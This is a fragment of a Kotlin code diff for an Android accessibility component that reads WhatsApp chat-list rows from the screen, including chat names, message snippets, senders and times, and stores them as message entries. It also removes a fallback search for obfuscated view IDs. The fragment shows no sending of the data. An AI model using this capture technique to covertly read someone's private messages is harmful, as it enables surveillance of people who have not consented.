                                 entriesToInsert += WhatsAppMessageEntry(
-                                    chatName = name,
-                                    sender = if (isRowOutgoing) "me" else name,
-                                    messageText = preview,
-                                    isOutgoing = isRowOutgoing,
+                                    chatName = title,
+                                    sender = if (isSnippetOutgoing) "me" else (rowSender ?: title),
+                                    messageText = snippet,
+                                    isOutgoing = isSnippetOutgoing,
                                     messageTimeEpochMs = rowTimeMs
                                 )
-                            }
-                        }
-                    }
-                } else {
-                    // Fallback row container search when view IDs are obfuscated
-                    val candidateRows = mutableListOf<AccessibilityNodeInfo>()
-                    fun findChatRows(node: AccessibilityNodeInfo?) {
-                        if (node == null) return
-                        val count = node.childCount
-                        val rect = Rect()
-                        node.getBoundsInScreen(rect)
-                        val w = rect.width()
-                        val h = rect.height()
-                        if ((node.isClickable || count in 1..10) && w > (screenWidth * 0.5) && h in 70..420) {
-                            val texts = collectTexts(node)
-                            if (texts.size >= 2 && texts.any { !isTimeOrDate(it) && !isSystemLabel(it) && !isBadge(it) }) {
-                                candidateRows.add(node)
-                            }
-                        }
-                        for (i in 0 until count) {
-                            findChatRows(node.getChild(i))
-                        }
-                    }
-                    findChatRows(root)
-
-                    for (row in candidateRows) {
-                        val texts = collectTexts(row)
-                        val candidateTitles = texts.filter {
-                            !isTimeOrDate(it) && !isSystemLabel(it) && !isBadge(it) && it.length <= 50
-                        }
-                        if (candidateTitles.isNotEmpty()) {
-                            val title = candidateTitles.first()
-                            var snippet = texts.firstOrNull { it != title && !isTimeOrDate(it) && !isBadge(it) && !isSystemLabel(it) }
-                            val timeText = texts.firstOrNull { isTimeOrDate(it) }
-                            val rowTimeMs = if (timeText != null) parseBubbleTime(timeText) else now
-
-                            var isSnippetOutgoing = false
-                            if (snippet?.startsWith("You: ", ignoreCase = true) == true) {
-                                isSnippetOutgoing = true
-                                snippet = snippet.substring(5).trim()
-                            }
-
-                            if (!snippet.isNullOrBlank() && snippet != "Recent conversation" && !isSystemLabel(snippet)) {
-                                val dedupeKey = "ROW|$title|$snippet|$rowTimeMs"
-                                if (!capturedWhatsAppMsgHashes.contains(dedupeKey)) {
-                                    capturedWhatsAppMsgHashes.add(dedupeKey)
-                                    if (capturedWhatsAppMsgHashes.size > 2000) capturedWhatsAppMsgHashes.clear()
-                                    entriesToInsert += WhatsAppMessageEntry(
-                                        chatName = title,
-                                        sender = if (isSnippetOutgoing) "me" else title,
-                                        messageText = snippet,
-                                        isOutgoing = isSnippetOutgoing,
-                                        messageTimeEpochMs = rowTimeMs
-                                    )
-                                }
                             }
                         }
                     }
